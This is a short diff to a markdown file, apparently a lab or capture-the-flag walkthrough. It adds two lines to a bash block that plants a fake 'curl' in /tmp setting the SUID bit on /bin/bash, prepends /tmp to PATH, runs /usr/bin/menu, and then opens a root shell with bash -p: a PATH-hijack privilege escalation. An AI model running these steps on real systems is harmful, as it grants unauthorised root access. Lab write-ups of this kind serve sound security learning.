@@ -98,6 +98,8 @@ curl -I localhost
 ```bash
 echo -e '#!/bin/bash\n\nchmod u+s /bin/bash' > /tmp/curl
 chmod +x /tmp/curl
+export PATH=/tmp:$PATH
+/usr/bin/menu
 /bin/bash -p
 ```
 
